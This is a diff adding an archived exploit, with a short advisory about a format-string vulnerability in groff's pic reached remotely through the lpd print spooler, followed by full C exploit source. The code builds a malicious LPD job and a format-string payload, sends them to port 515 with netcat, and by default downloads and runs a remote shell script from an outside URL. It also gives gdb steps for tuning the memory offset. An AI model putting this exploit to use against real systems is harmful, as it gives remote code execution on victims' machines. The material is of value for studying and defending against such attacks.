@@ -1,0 +1,193 @@
+source: http://www.securityfocus.com/bid/3103/info
+
+lpd is the print spooling daemon. It is used to support network printing on a variety of unix platforms.
+
+The version of lpd that ships with linux systems invokes groff to process documents that are to be printed. The groff utility used to process images, 'pic', contains a vulnerability that can be exploited to execute arbitrary commands on the victim.
+
+It may be possible for remote attackers to exploit this vulnerability through lpd.
+
+#include<stdio.h>
+       ///////////////////////////////////////////////////////////////////
+      ///      //     //   ///   ////     ////      //      //////______/
+     ///  //  // //////  / / /  ///  ////  ////  ////  //////////______/
+    ///     ///    ///  // //  ///  ////  ////  ////     ///////    ///
+   ///  //  // //////  /////  ///  ////  ////  ////  //////////____///
+  ///  //  // //////  /////  ///  ////  ////  ////  /////////////////
+ ///  //  //     //  /////  ////     //////  ////      /////////////
+///////////////////////////////////////////////////////////////////
+     //              \\  -- zen-parse --  \\
+    //                \\___________________\\
+   //                  \    Remote access    \
+  //                    \_____________________\
+
+//               pic format string exploit
+//               =========================
+// This version -  Sat Jun 23 21:35:31 NZST 2001
+// (updated to fix broken link Thu Jul 27 23:45:34 NZST 2001)
+//
+// pic is part of the groff package. It is used by troff-to-ps.fpi as uid lp
+// when perl, troff and LPRng are installed.
+//
+// The address given is not the exact address, but it works.
+// (see /* comments below */ for information on why it's not the exact address)
+//
+// The offset given is (close enough to) the address for the
+// version of /usr/bin/pic from the rpm that comes redhat 7.0
+// (groff-1.16-7) The method used to find the offset in your
+// version of pic could be something like this :-
+/*
+
+bash-2.04$ gdb -q /usr/bin/pic
+(no debugging symbols found)...(gdb)
+(gdb) break getopt
+Breakpoint 1 at 0x8048e94
+(gdb) display/i $eip
+(gdb) r -S
+Starting program: /usr/bin/pic -S
+Breakpoint 1 at 0x4014d552: file getopt.c, line 987.
+
+Breakpoint 1, getopt (argc=2, argv=0xbffffa84,
+    optstring=0x8060bc9 "T:CDSUtcvnxzpf") at getopt.c:987
+987     getopt.c: No such file or directory.
+1: x/i $eip  0x4014d552 <getopt+18>:    mov    0x10(%ebp),%ecx
+(gdb)
+ (
+   type nexti a few (mebe a dozen or 2?)  times until you see something like
+                movl   $0x1,%ebx
+   in which case the next instruction contains safe_address, or
+                movl   $0x1,0xsomeaddress
+   in which case safe_address is 0xsomeaddress
+
+   IE: It is the the address used by the first instructions
+   that assign a value of 1 to an address after the getopt() call.
+
+ )
+1: x/i $eip  0x80523c2 <strcpy+37758>:  mov    $0x1,%ebx
+(gdb)
+0x80523c7       31      in ../sysdeps/generic/strcpy.c
+1: x/i $eip  0x80523c7 <strcpy+37763>:  mov    %ebx,0x806feec
+(gdb) q
+
+In this case, the address is 0x0806feec, however you may need to aim for
+just a little before that, due to what are probably rounding errors in the
+conversion between int->float->int, and using the least significant
+digits.
+
+This means: You may need to play a little to get it working on your machine.
+
+*/
+
+
+#define PICURL  "http://crash.ihug.co.nz/~Sneuro/samplelpdscript.sh"
+#error "http://mp3.com/cosv needs visiting"
+#define SAFER_ADDRESS 0x0806feeb
+#define QUEUE "lp"
+
+FILE *pip;
+char *payload(char *cmd,int safer);
+char *eos(char *s)
+{
+ return s+strlen(s);
+}
+
+output(char *s,char*addr,FILE*pip)
+{
+ char v[]=
+"Aroot@%s+666\n"
+"CA\n"
+"D2001-06-23-08:59:18.714\n"
+"Hclarity.local\n"
+"J/tmp/hack-attempt\n"
+"Lroot\n"
+"Proot\n"
+"Qlp\n"
+"N/tmp/sh.c\n"
+"fdfA666%s\n"
+"UdfA666%s\n";
+
+ char nv[1024];
+
+ fprintf(pip,"\x2"QUEUE"\n");
+ sprintf(nv,v,addr,addr,addr);
+ fprintf(pip,"\x2%d cfA666%s\n",strlen(nv),addr);
+ fprintf(pip,"%s",nv);
+ fflush(pip);
+ putc(0,pip);
+ fflush(pip);
+ fprintf(pip,"\x3%d dfA666%s\n",strlen(s),addr);
+ fprintf(pip,"%s",s);
+ fflush(pip);
+ putc(0,pip);
+ fflush(pip);
+}
+
+
+main(int argc,char *argv[])
+{
+ int safer=SAFER_ADDRESS;
+ char pcmd[1024];
+ char *cmd=0;
+ char *addr=0;
+ char *evil=0;
+
+ if(argc==1)addr="-h";
+ if(!addr)addr=(char*)malloc(256);
+ if(argc>2)safer=(int)strtoul(argv[2],0,16);
+ if(argc>1)addr=argv[1];
+ if(argc>3)cmd=argv[3];
+ else
+ {
+  if(!cmd)cmd=(char*)malloc(512);
+  strcpy(cmd,
+    "export HOME=/tmp;/usr/bin/lynx -dump "PICURL
+    ">/tmp/lpd.cmd.$$;chmod +x /tmp/lpd.cmd.$$;/tmp/lpd.cmd.$$");
+ }
+ if(!*addr)addr=(char*)malloc(256);
+ if(!strcmp(addr,"-h"))
+ {
+  printf("%s ip-address safer-address 'commands in quotes'\n",argv[0]);
+  exit(1);
+ }
+ evil=payload(cmd,safer);
+ sprintf(pcmd,"nc %s 515",addr);
+ pip=popen(pcmd,"w");
+ output(evil,addr,pip);
+ if(pclose(pip))
+ {
+  printf("It might not've worked.\nThe command returned a funny value.\n");
+  printf("check you have netcat (nc) in your path.\n");
+  exit(1);
+ }
+}
+
+
+char *payload(char *cmd,int safer)
+{
+ char *retstr;
+ char *tmp;
+ retstr=(char*)malloc(4096);
+ sprintf(retstr,".PS\n");
+
+        //  %f is 8 bytes long the two values are  \\
+       //  needed. the value was just the first one \\
+      // that I had in there... it it ain't broke... \\
+
+ tmp=eos(retstr);
+ sprintf(tmp,"plot %5.20f \"%%n\"\n",safer,0xbffffa08);
+ tmp=eos(retstr);
+ sprintf(tmp,"sh X%sX\n",cmd);
+ tmp=eos(retstr);
+ sprintf(tmp,".PE\n");
+ tmp=eos(retstr);
+ sprintf(tmp,"This is the way we hack the printer,\n");
+ tmp=eos(retstr);
+ sprintf(tmp,"Hack the printer, hack the printer.\n");
+ tmp=eos(retstr);
+ sprintf(tmp,"This is the way we hack the printer,\n");
+ tmp=eos(retstr);
+ sprintf(tmp,"when they are running a vulnerable version\n");
+ tmp=eos(retstr);
+ sprintf(tmp,"of groff.\n");
+ tmp=eos(retstr);
+ return retstr;
+}
